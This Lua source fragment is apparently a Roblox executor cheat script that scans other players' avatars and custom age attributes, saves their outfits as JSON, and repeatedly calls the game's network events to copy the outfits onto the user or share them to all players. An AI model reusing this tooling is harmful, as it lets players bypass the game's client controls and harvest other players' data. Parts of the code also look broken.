    avatarFrame.Parent = AssetScroll

    local bigViewport = Instance.new("ViewportFrame")
    bigViewport.Size = UDim2.new(1, 0, 1, 0)
    bigViewport.BackgroundTransparency = 1
    bigViewport.Parent = avatarFrame

    -- Viewport generation using the frozen snapshot (Immune to live changes!)
    task.spawn(function()
        local charClone
        local success = pcall(function()
            -- Builds a fresh dummy using the frozen snapshot data
            charClone = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R15)
        end)
        
        -- Fallback if Roblox's API fails
        if not success or not charClone then
            pcall(function()
                local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local oldArch = myChar.Archivable
                myChar.Archivable = true
                charClone = myChar:Clone()
                myChar.Archivable = oldArch
                local hum = charClone:FindFirstChildOfClass("Humanoid")
                if hum then hum:ApplyDescription(description) end
            end)
        end

        if charClone then
            for _, v in pairs(charClone:GetDescendants()) do
                if v:IsA("Script") or v:IsA("LocalScript") then
                    v:Destroy()
                end
            end
            
            charClone.Parent = bigViewport
            local camera = Instance.new("Camera")
            camera.Parent = bigViewport
            
            local hrp = charClone:FindFirstChild("HumanoidRootPart") or charClone:FindFirstChild("Torso") or charClone:FindFirstChild("UpperTorso")
            if hrp then
                camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -6) * CFrame.Angles(0, math.pi, 0)
                camera.Focus = hrp.CFrame
            end
            
            bigViewport.CurrentCamera = camera
        end
    end)

    local success, description = pcall(function()
        return humanoid:GetAppliedDescription()
    end)

    if not success or not description then return end

    do
        local infoFrame = Instance.new("Frame")
        infoFrame.Size = UDim2.new(1, -5, 0, 80)
        infoFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
        infoFrame.BorderSizePixel = 0
      infoFrame.LayoutOrder = 3
        infoFrame.Parent = AssetScroll

        local infoTitle = Instance.new("TextLabel")
        infoTitle.Size = UDim2.new(1, -10, 0, 20)
        infoTitle.Position = UDim2.new(0, 5, 0, 6)
        infoTitle.Text = "Avatar Info"
        infoTitle.BackgroundTransparency = 1
        infoTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
        infoTitle.Font = Enum.Font.SourceSansBold
        infoTitle.TextSize = 14
        infoTitle.TextXAlignment = Enum.TextXAlignment.Left
        infoTitle.Parent = infoFrame

        local rigLabel = Instance.new("TextLabel")
        rigLabel.Size = UDim2.new(1, -10, 0, 16)
        rigLabel.Position = UDim2.new(0, 5, 0, 28)
        local rigText = "Rig: "
        pcall(function()
            rigText = rigText .. tostring(humanoid.RigType and tostring(humanoid.RigType):gsub("Enum.HumanoidRigType.", "") or "Unknown")
        end)
        rigLabel.Text = rigText
        rigLabel.BackgroundTransparency = 1
        rigLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        rigLabel.Font = Enum.Font.SourceSans
        rigLabel.TextSize = 12
        rigLabel.TextXAlignment = Enum.TextXAlignment.Left
        rigLabel.Parent = infoFrame

        local function safeGet(prop)
            local ok, val = pcall(function() return description[prop] end)
            if ok and val ~= nil then return val else return nil end
        end

        local headScale = safeGet("HeadScale")
        local heightScale = safeGet("HeightScale")
        local widthScale = safeGet("WidthScale")
        local bodyTypeScale = safeGet("BodyTypeScale")
        local proportionScale = safeGet("ProportionScale")

        local scalesText = "HeadScale: " .. tostring(headScale or "N/A")
                        .. "  HeightScale: " .. tostring(heightScale or "N/A")
                        .. "\nWidthScale: " .. tostring(widthScale or "N/A")
                        .. "  BodyTypeScale: " .. tostring(bodyTypeScale or "N/A")
                        .. "  ProportionScale: " .. tostring(proportionScale or "N/A")

        local scalesLabel = Instance.new("TextLabel")
        scalesLabel.Size = UDim2.new(1, -10, 0, 34)
        scalesLabel.Position = UDim2.new(0, 5, 0, 44)
        scalesLabel.Text = scalesText
        scalesLabel.BackgroundTransparency = 1
        scalesLabel.TextColor3 = Color3.fromRGB(190, 190, 200)
        scalesLabel.Font = Enum.Font.Code
        scalesLabel.TextSize = 12
        scalesLabel.TextXAlignment = Enum.TextXAlignment.Left
        scalesLabel.TextWrapped = true
        scalesLabel.Parent = infoFrame

        local outfitData = {}
        local function getVal(prop)
            local ok, val = pcall(function() return description[prop] end)
            if not ok or val == nil then return nil end
            return val
        end

          outfitData.SwimAnimation = getVal("SwimAnimation")
        
        -- FIXED: Grab the actual HeadColor to use as the overall SkinTone
        local hc = getVal("HeadColor")
        if typeof(hc) == "Color3" then
            outfitData.SkinTone = {hc.R, hc.G, hc.B}
        end
        
        outfitData.Face = getVal("Face")

        outfitData.JumpAnimation = getVal("JumpAnimation")
        outfitData.ClimbAnimation = getVal("ClimbAnimation")
        outfitData.Shirt = getVal("Shirt")
        outfitData.Pants = getVal("Pants")
        outfitData.RightArm = getVal("RightArm")
   
outfitData.WalkAnimation = getVal("WalkAnimation")
        task.wait(0.1)
outfitData.WalkAnimation = getVal("WalkAnimation")

        outfitData.Head = getVal("Head")
        outfitData.WidthScale = widthScale
        outfitData.GraphicTShirt = getVal("GraphicTShirt")

      -- Pull the custom age attribute directly from the player being scanned
        local targetAge = targetPlayer:GetAttribute("age")
        if targetAge then 
            outfitData.Age = tostring(targetAge) 
        end
        
        outfitData.RunAnimation = getVal("RunAnimation")
        outfitData.FallAnimation = getVal("FallAnimation")
        outfitData.IdleAnimation = getVal("IdleAnimation")
        outfitData.Accessories = {}

        pcall(function()
            local accs = description:GetAccessories(true)
            if accs and type(accs) == "table" then
                for _, a in pairs(accs) do
                    table.insert(outfitData.Accessories, {
                        AssetId = a.AssetId,
                        IsLayered = a.IsLayered,
                        AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType
                    })
                end
            end
        end)

        outfitData.LeftArm = getVal("LeftArm")
        outfitData.RightLeg = getVal("RightLeg")
        outfitData.HeightScale = heightScale

        outfitData.BodyTypeScale = bodyTypeScale
        outfitData.ProportionScale = proportionScale
        outfitData.HeadScale = headScale

        outfitData.Torso = getVal("Torso")
        outfitData.LeftLeg = getVal("LeftLeg")

             local safeOutfit = {}
        for k, v in pairs(outfitData) do
            if typeof(v) == "Instance" or typeof(v) == "EnumItem" then
                safeOutfit[k] = tostring(v)
            else
                safeOutfit[k] = v
            end
        end
        
        -- INJECT THE TIMESTAMP: Save the exact Unix time this was scanned
        safeOutfit.SavedAtTime = os.time()

        local ok, jsonText = pcall(function()
            return HttpService:JSONEncode(safeOutfit)
        end)

        -- Action Panel & Raw JSON Output Box
            -- Raw JSON Output Box
        local rawFrame = Instance.new("Frame")
        rawFrame.Size = UDim2.new(1, -5, 0, 165) 
        rawFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        rawFrame.BorderSizePixel = 0
        rawFrame.LayoutOrder = 4 -- Puts JSON at the very bottom
        rawFrame.Parent = AssetScroll

        local rawTitle = Instance.new("TextLabel")
        rawTitle.Size = UDim2.new(1, -10, 0, 18)
        rawTitle.Position = UDim2.new(0, 5, 0, 6)
        rawTitle.Text = "Raw JSON Data"
        rawTitle.BackgroundTransparency = 1
        rawTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
        rawTitle.Font = Enum.Font.SourceSansBold
        rawTitle.TextSize = 13
        rawTitle.TextXAlignment = Enum.TextXAlignment.Left
        rawTitle.Parent = rawFrame

        local rawBox = Instance.new("TextBox")
        rawBox.Size = UDim2.new(1, -10, 0, 130)
        rawBox.Position = UDim2.new(0, 5, 0, 26)
        rawBox.Text = ok and jsonText or "{}"
        rawBox.TextWrapped = true
        rawBox.TextXAlignment = Enum.TextXAlignment.Left
        rawBox.TextYAlignment = Enum.TextYAlignment.Top
        rawBox.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
        rawBox.TextColor3 = Color3.fromRGB(220, 220, 220)
        rawBox.Font = Enum.Font.Code
        rawBox.TextSize = 11
        rawBox.ClearTextOnFocus = false
        rawBox.TextEditable = false
        rawBox.TextScaled = false
        rawBox.MultiLine = true
        rawBox.Parent = rawFrame

        -- ==========================================
        -- NEW ACTION PANEL (Moved Above Avatar Info!)
        -- ==========================================
        local actionFrame = Instance.new("Frame")
        actionFrame.Size = UDim2.new(1, -5, 0, 60)
        actionFrame.BackgroundTransparency = 1
        actionFrame.LayoutOrder = 2 -- Magically places it right below the 3D Avatar!
        actionFrame.Parent = AssetScroll

        -- Button Layout Container
        local actionLayout = Instance.new("Frame")
        actionLayout.Size = UDim2.new(1, -10, 1, 0)
        actionLayout.Position = UDim2.new(0, 5, 0, 0)
        actionLayout.BackgroundTransparency = 1
        actionLayout.Parent = actionFrame

        -- Grid Layout specifically designed for 4 buttons per row
        local uigrid = Instance.new("UIGridLayout")
        uigrid.CellSize = UDim2.new(0.235, 0, 0, 26) 
        uigrid.CellPadding = UDim2.new(0.02, 0, 0.08, 0)
        uigrid.SortOrder = Enum.SortOrder.LayoutOrder
        uigrid.FillDirectionMaxCells = 4
        uigrid.Parent = actionLayout

        -- ==========================================
        -- ROW 1: COPY, SAVE, TRY ON, TRY & SHARE
        -- ==========================================
    local copyBtn = Instance.new("TextButton")
        copyBtn.Text = "Copy JSON"
        copyBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
        copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        copyBtn.Font = Enum.Font.SourceSansBold
        copyBtn.TextSize = 11
        copyBtn.BorderSizePixel = 0
        copyBtn.LayoutOrder = 1
        copyBtn.Parent = actionLayout

        local saveBtn = Instance.new("TextButton")
        saveBtn.Text = "Save File"
        saveBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        saveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        saveBtn.Font = Enum.Font.SourceSansBold
        saveBtn.TextSize = 11
        saveBtn.BorderSizePixel = 0
        saveBtn.LayoutOrder = 2
        saveBtn.Parent = actionLayout

        local wearBtn = Instance.new("TextButton")
        wearBtn.Text = "Try On"
        wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        wearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        wearBtn.Font = Enum.Font.SourceSansBold
        wearBtn.TextSize = 11
        wearBtn.BorderSizePixel = 0
        wearBtn.LayoutOrder = 3
        wearBtn.Parent = actionLayout

        local tryShareBtn = Instance.new("TextButton")
        tryShareBtn.Text = "Share All"
        tryShareBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 200)
        tryShareBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        tryShareBtn.Font = Enum.Font.SourceSansBold
        tryShareBtn.TextSize = 11
        tryShareBtn.BorderSizePixel = 0
        tryShareBtn.LayoutOrder = 4
        tryShareBtn.Parent = actionLayout

        -- ==========================================
        -- ROW 2: VIEW, WHITELIST
        -- ==========================================
        local viewBtn = Instance.new("TextButton")
        viewBtn.Text = "View"
        viewBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
        viewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        viewBtn.Font = Enum.Font.SourceSansBold
        viewBtn.TextSize = 11
        viewBtn.BorderSizePixel = 0
        viewBtn.LayoutOrder = 5
        viewBtn.Parent = actionLayout

        local isWl = massWhitelist[targetPlayer.Name]
        local wlBtn = Instance.new("TextButton")
        wlBtn.Text = isWl and "Safe" or "Whitelist"
        wlBtn.BackgroundColor3 = isWl and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(50, 50, 60)
        wlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        wlBtn.Font = Enum.Font.SourceSansBold
        wlBtn.TextSize = 11
        wlBtn.BorderSizePixel = 0
        wlBtn.LayoutOrder = 6
        wlBtn.Parent = actionLayout
 -- ==========================================
   
     -- ==========================================
        -- LOGIC CONNECTIONS
        -- ==========================================
        tryShareBtn.MouseButton1Click:Connect(function()
            shareOutfitToAll(outfitData, tryShareBtn, "Share All", Color3.fromRGB(200, 100, 200))
        end)

      -- [NEW CONNECTIONS FOR VIEW & WHITELIST]
        viewBtn.MouseButton1Click:Connect(function()
            startView(targetPlayer)
            viewBtn.Text = "Viewing!"
            viewBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            task.wait(1.5)
            viewBtn.Text = "View"
            viewBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
        end)

        wlBtn.MouseButton1Click:Connect(function()
            massWhitelist[targetPlayer.Name] = not massWhitelist[targetPlayer.Name]
            local nowWl = massWhitelist[targetPlayer.Name]
            wlBtn.Text = nowWl and "Safe" or "Whitelist"
            wlBtn.BackgroundColor3 = nowWl and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(50, 50, 60)
        end)


        -- Action Connections
        copyBtn.MouseButton1Click:Connect(function()
            setclipboard(rawBox.Text)
            copyBtn.Text = "Copied!"
            task.wait(2)
            copyBtn.Text = "Copy JSON"
        end)

        saveBtn.MouseButton1Click:Connect(function()
            if writefile then
                local folder = "lifetogether_admin_savedoutfits"
                if makefolder and not isfolder(folder) then
                    pcall(makefolder, folder)
                end
                
                local baseName = targetPlayer.Name .. "_Scanned"
                local fileName = folder .. "/" .. baseName .. ".json"
                local counter = 1
                
                while isfile(fileName) do
                    fileName = folder .. "/" .. baseName .. "_" .. tostring(counter) .. ".json"
                    counter = counter + 1
                end

                local s, e = pcall(function()
                    writefile(fileName, rawBox.Text)
                end)
                if s then
                    saveBtn.Text = "Saved!"
                    saveBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                else
                    saveBtn.Text = "Error Saving"
                    saveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                end
            else
                saveBtn.Text = "Not Supported"
                saveBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end
            task.wait(2)
            saveBtn.Text = "Save Outfit"
            saveBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)

        wearBtn.MouseButton1Click:Connect(function()
            local payload = buildBatchPayload(outfitData)
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)

            if not Send then
                wearBtn.Text = "Loading Net..."
                wearBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
                -- Silently fetch and execute the game's network API so this script runs standalone
             end

            if Send then
                wearBtn.Text = "Applying..."
                wearBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
                
                task.spawn(function()
                    for i = 1, 3 do
                        Send("wear_outfit_from_desc", payload)
                        task.wait(0.1)
                    end
                    task.wait(0.2)
                    
                    if outfitData.SkinTone then
                        pcall(function()
                            local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3])
                            for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end
                        end)
                        task.wait(0.2)
                    end
                    
                               --      if outfitData.Age and Get then
                     --   pcall(function()
                        --    Get("age", tostring(outfitData.Age)) 
                        --   end)
            
                   -- end

                    
                    if outfitData.HeightScale then
                        pcall(function()
                            for i = 1, 3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.1) end
                        end)
                    end
                    if outfitData.WidthScale then
                        pcall(function()
                            for i = 1, 3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.1) end
                        end)
                    end
------
                            if outfitData.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.1) end end
if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.1) end end


                    wearBtn.Text = "Applied!"
                    wearBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
                    task.wait(2)
                    wearBtn.Text = "Try On (Server)"
                    wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
                end)
            else
                wearBtn.Text = "Net Error"
                wearBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
                task.wait(2)
                wearBtn.Text = "Try On (Server)"
                wearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
            end
        end)
    end

    if description.Shirt ~= 0 then createDetailedAssetCard("Classic Shirt", description.Shirt, "HumanoidDesc.Shirt") end
    if description.Pants ~= 0 then createDetailedAssetCard("Classic Pants", description.Pants, "HumanoidDesc.Pants") end
    if description.GraphicTShirt ~= 0 then createDetailedAssetCard("T-Shirt Graphic", description.GraphicTShirt, "HumanoidDesc.GraphicTShirt") end
    if description.Face ~= 0 then createDetailedAssetCard("Face Texture", description.Face, "HumanoidDesc.Face") end

    local bodyParts = {
        "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"
    }
    for _, part in ipairs(bodyParts) do
        local partId = tonumber(description[part]) or 0
        if partId ~= 0 then
            createDetailedAssetCard("Body: " .. part, partId, "HumanoidDesc." .. part)
        end
    end

    local animations = {
        "IdleAnimation", "RunAnimation", "WalkAnimation", "JumpAnimation",
        "ClimbAnimation", "FallAnimation", "SwimAnimation"
    }
    for _, anim in ipairs(animations) do
        local animId = tonumber(description[anim]) or 0
        if animId ~= 0 then
            createDetailedAssetCard("Anim: " .. anim:gsub("Animation", ""), animId, "HumanoidDesc." .. anim)
        end
    end

    local accessories = description:GetAccessories(true)
    for _, acc in pairs(accessories) do
        local accType = tostring(acc.AccessoryType):gsub("Enum.AccessoryType.", "")
        local label = acc.IsLayered and ("Layered " .. accType) or accType
        createDetailedAssetCard(label, acc.AssetId, "HumanoidDesc." .. accType)
    end
end
populateSavedOutfits = function()
    -- Clear current list
    for _, child in pairs(SavedScroll:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end

    local folderName = "lifetogether_admin_savedoutfits"
    if not isfolder or not isfolder(folderName) then return end

       -- 1. Collect all valid outfits into a table first
    local outfitsList = {}
    
    for _, file in ipairs(listfiles(folderName)) do
        if file:match("%.json$") then
            local name = file:match("([^/\\]+)%.json$")
            local ok, content = pcall(readfile, file)
            
            if ok and content and #content > 0 then
                local success, data = pcall(function() return HttpService:JSONDecode(content) end)
                if success and type(data) == "table" then
                    local isScanned = string.find(name, "_Scanned") ~= nil
                    -- Extract the time we saved earlier (Default to 0 for older saved files)
                    local savedTime = tonumber(data.SavedAtTime) or 0
                    
                    table.insert(outfitsList, {
                        name = name,
                        data = data,
                        file = file,
                        isScanned = isScanned,
                        time = savedTime
                    })
                end
            end
        end
    end

    -- 2. Sort the table: Scanned outfits first, then Latest to Oldest
    table.sort(outfitsList, function(a, b)
        -- Keep scanned files pinned to the very top
        if a.isScanned and not b.isScanned then
            return true
        elseif not a.isScanned and b.isScanned then
            return false
        else
            -- If neither is scanned (or both are), sort by newest time first
            if a.time ~= b.time then
                return a.time > b.time
            else
                -- Fallback to alphabetical if they have the exact same time (or are old saves without a time)
                return string.lower(a.name) < string.lower(b.name)
            end
        end
    end)

    -- 3. Build the UI in the sorted order
    for _, outfitInfo in ipairs(outfitsList) do
        local name = outfitInfo.name
        local data = outfitInfo.data
        local file = outfitInfo.file

        local Entry = Instance.new("Frame")
        Entry.Size = UDim2.new(1, -5, 0, 40)
        Entry.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        Entry.BorderSizePixel = 0
        Entry.Parent = SavedScroll

        -- NEW: Mini 3D Viewport Thumbnail
        local SmallViewport = Instance.new("ViewportFrame")
        SmallViewport.Size = UDim2.new(0, 30, 0, 30)
        SmallViewport.Position = UDim2.new(0, 5, 0, 5)
        SmallViewport.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
        SmallViewport.BorderSizePixel = 0
        SmallViewport.Parent = Entry

        -- Background thread to build the avatar and take a picture
        task.spawn(function()
            -- Build a Roblox Description out of the saved JSON first
            local desc = Instance.new("HumanoidDescription")
            desc.Shirt = data.Shirt or 0
            desc.Pants = data.Pants or 0
            desc.GraphicTShirt = data.GraphicTShirt or 0
            desc.Face = data.Face or 0
            desc.Head = data.Head or 0

            if data.SkinTone then
                local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3])
                desc.HeadColor = c
                desc.TorsoColor = c
                desc.LeftArmColor = c
                desc.RightArmColor = c
                desc.LeftLegColor = c
                desc.RightLegColor = c
            end

            -- Safely attach accessories by grouping their types
            if data.Accessories then
                local accGroups = {}
                for _, acc in pairs(data.Accessories) do
                    local typeName = acc.AccessoryType
                    -- Ensure "Accessory" is appended if it's not already there
                    if not string.find(typeName, "Accessory") then
                        typeName = typeName .. "Accessory"
                    end
                    
                    if accGroups[typeName] then
                        accGroups[typeName] = accGroups[typeName] .. "," .. tostring(acc.AssetId)
                    else
                        accGroups[typeName] = tostring(acc.AssetId)
                    end
                end
                for prop, val in pairs(accGroups) do
                    pcall(function() desc[prop] = val end)
                end
            end

            -- Create a fresh, fully-loaded model using Roblox's built-in API
            local dummy
            local success, err = pcall(function()
                -- This guarantees all layered clothing and accessories are downloaded and built
                dummy = Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R15)
            end)

            -- Fallback just in case the API fails (uses LocalPlayer)
            if not success or not dummy then
                pcall(function()
                    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                    local oldArch = myChar.Archivable
                    myChar.Archivable = true
                    dummy = myChar:Clone()
                    myChar.Archivable = oldArch
                    
                    local hum = dummy:FindFirstChildOfClass("Humanoid")
                    if hum then
                        hum:ApplyDescription(desc)
                    end
                end)
            end

            if dummy then
                for _, v in pairs(dummy:GetDescendants()) do
                    if v:IsA("Script") or v:IsA("LocalScript") then v:Destroy() end
                end

                dummy.Parent = SmallViewport
    
                -- FIX: Create the missing camera instance
                local camera = Instance.new("Camera")
                camera.Parent = SmallViewport
    
                -- Target the center of the body instead of the head
                local hrp = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("UpperTorso") or dummy:FindFirstChild("Torso")
                if hrp then
                    -- Pull the camera back to -5.5 studs and up slightly to frame the whole body
                    camera.CFrame = hrp.CFrame * CFrame.new(0, 0.5, -5.5) * CFrame.Angles(0, math.pi, 0)
                    camera.Focus = hrp.CFrame
                end
                
                SmallViewport.CurrentCamera = camera
            end
        end)


        -- Text Box shifted over to make room for the picture
        local NameBox = Instance.new("TextBox")
        NameBox.Size = UDim2.new(0.35, -30, 1, 0)
        NameBox.Position = UDim2.new(0, 40, 0, 0)
        NameBox.BackgroundTransparency = 1
        NameBox.Text = name
        
        if outfitInfo.isScanned then
            NameBox.TextColor3 = Color3.fromRGB(0, 255, 200)
        else
            NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
        
        NameBox.Font = Enum.Font.SourceSansBold
        NameBox.TextSize = 14
        NameBox.TextXAlignment = Enum.TextXAlignment.Left
        NameBox.ClearTextOnFocus = false
        NameBox.Parent = Entry

      local WearBtn = Instance.new("TextButton")
        WearBtn.Size = UDim2.new(0.14, 0, 0, 26)
        WearBtn.Position = UDim2.new(0.38, 0, 0.5, -13)
        WearBtn.Text = "Wear"
        WearBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        WearBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        WearBtn.Font = Enum.Font.SourceSansBold
        WearBtn.TextSize = 11
        WearBtn.BorderSizePixel = 0
        WearBtn.Parent = Entry

        local RenameBtn = Instance.new("TextButton")
        RenameBtn.Size = UDim2.new(0.16, 0, 0, 26)
        RenameBtn.Position = UDim2.new(0.53, 0, 0.5, -13)
        RenameBtn.Text = "Rename"
        RenameBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
        RenameBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        RenameBtn.Font = Enum.Font.SourceSansBold
        RenameBtn.TextSize = 11
        RenameBtn.BorderSizePixel = 0
        RenameBtn.Parent = Entry

        local DeleteBtn = Instance.new("TextButton")
        DeleteBtn.Size = UDim2.new(0.12, 0, 0, 26)
        DeleteBtn.Position = UDim2.new(0.70, 0, 0.5, -13)
        DeleteBtn.Text = "Del"
        DeleteBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        DeleteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        DeleteBtn.Font = Enum.Font.SourceSansBold
        DeleteBtn.TextSize = 11
        DeleteBtn.BorderSizePixel = 0
        DeleteBtn.Parent = Entry

        -- NEW: Share All Button for Saved Outfits
        local ShareBtn = Instance.new("TextButton")
        ShareBtn.Size = UDim2.new(0.16, 0, 0, 26)
        ShareBtn.Position = UDim2.new(0.83, 0, 0.5, -13)
        ShareBtn.Text = "All Share"
        ShareBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 200)
        ShareBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        ShareBtn.Font = Enum.Font.SourceSansBold
        ShareBtn.TextSize = 11
        ShareBtn.BorderSizePixel = 0
        ShareBtn.Parent = Entry

              -- [NEW] Share All Logic for Saved Outfit
        ShareBtn.MouseButton1Click:Connect(function()
            shareOutfitToAll(data, ShareBtn, "Share All", Color3.fromRGB(200, 100, 200))
        end)

        -- Wear Logic
        WearBtn.MouseButton1Click:Connect(function()
            WearBtn.Text = "..."
            local payload = buildBatchPayload(data)
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
            
            if Send then
                task.spawn(function()
                    for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
                    task.wait(0.2)
                    if data.SkinTone then pcall(function() local c = Color3.new(data.SkinTone[1], data.SkinTone[2], data.SkinTone[3]) for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end end) end
               --     if data.Age and Get then pcall(function() Get("age", tostring(data.Age)) end) end
                    if data.HeightScale then for i=1,3 do Send("body_scale", "HeightScale", data.HeightScale * 100) task.wait(0.1) end end
                    if data.WidthScale then for i=1,3 do Send("body_scale", "WidthScale", data.WidthScale * 100) task.wait(0.1) end end
                            
 if data.BodyTypeScale then for i=1,3 do Send("body_scale", "BodyTypeScale", data.BodyTypeScale * 100) task.wait(0.1) end end
 if data.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", data.ProportionScale * 100) task.wait(0.1) end end

                    WearBtn.Text = "Worn!"
                    task.wait(1.5)
                    WearBtn.Text = "Wear"
                end)
            end
        end)

        -- Rename Logic
        RenameBtn.MouseButton1Click:Connect(function()
            NameBox:CaptureFocus()
        end)
        NameBox.FocusLost:Connect(function()
            local newName = NameBox.Text:gsub("%s+", "")
            if newName ~= "" and newName ~= name then
                local oldPath = folderName .. "/" .. name .. ".json"
                local newPath = folderName .. "/" .. newName .. ".json"
                if not isfile(newPath) then
                    pcall(function()
                        writefile(newPath, HttpService:JSONEncode(data))
                        if isfile(oldPath) then delfile(oldPath) end
                    end)
                end
            end
            populateSavedOutfits()
        end)

        -- Delete Logic
        DeleteBtn.MouseButton1Click:Connect(function()
            pcall(function()
                if isfile(file) then delfile(file) end
            end)
            populateSavedOutfits()
        end)
    end
end

local function populatePlayerList()
    for _, child in pairs(PlayerScroll:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    for _, player in pairs(Players:GetPlayers()) do
        local PlayerBtn = Instance.new("TextButton")
        PlayerBtn.Size = UDim2.new(1, -5, 0, 50)
        PlayerBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        PlayerBtn.BorderSizePixel = 0
        PlayerBtn.Text = ""
        PlayerBtn.Parent = PlayerScroll

        local SmallViewport = Instance.new("ViewportFrame")
        SmallViewport.Size = UDim2.new(0, 40, 0, 40)
        SmallViewport.Position = UDim2.new(0, 5, 0, 5)
        SmallViewport.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
        SmallViewport.BorderSizePixel = 0
        SmallViewport.Parent = PlayerBtn

        task.spawn(function()
            local char = player.Character
            if char then
                local oldArchivable = char.Archivable
                char.Archivable = true
                local headClone = char:Clone()
                char.Archivable = oldArchivable

                if headClone then
                    headClone.Parent = SmallViewport
                    local camera = Instance.new("Camera")
                    camera.Parent = SmallViewport
                    
                    local head = headClone:FindFirstChild("Head")
                    if head then
                        camera.CFrame = head.CFrame * CFrame.new(0, 0, -2.5) * CFrame.Angles(0, math.pi, 0)
                        camera.Focus = head.CFrame
                    end
                    SmallViewport.CurrentCamera = camera
                end
            end
        end)

        local DisplayName = Instance.new("TextLabel")
        DisplayName.Size = UDim2.new(1, -60, 0, 20)
        DisplayName.Position = UDim2.new(0, 55, 0, 5)
        DisplayName.Text = player.DisplayName
        DisplayName.TextColor3 = Color3.fromRGB(255, 255, 255)
        DisplayName.Font = Enum.Font.SourceSansBold
        DisplayName.TextSize = 16
        DisplayName.TextXAlignment = Enum.TextXAlignment.Left
        DisplayName.BackgroundTransparency = 1
        DisplayName.Parent = PlayerBtn

        local Username = Instance.new("TextLabel")
        Username.Size = UDim2.new(1, -60, 0, 20)
        Username.Position = UDim2.new(0, 55, 0, 25)
        Username.Text = "@" .. player.Name
        Username.TextColor3 = Color3.fromRGB(150, 150, 150)
        Username.Font = Enum.Font.SourceSans
        Username.TextSize = 14
        Username.TextXAlignment = Enum.TextXAlignment.Left
        Username.BackgroundTransparency = 1
        Username.Parent = PlayerBtn

      -- [NEW] Capture the outfit data the exact moment the menu refreshes!
        local cachedDescription = nil
        pcall(function()
            local char = player.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then
                    cachedDescription = hum:GetAppliedDescription()
                end
            end
        end)
----
      
      PlayerBtn.MouseButton1Click:Connect(function()
            deepScanPlayerOutfit(player)
        end)
    end
end

-- Initialize
RefreshBtn.MouseButton1Click:Connect(populatePlayerList)
populatePlayerList()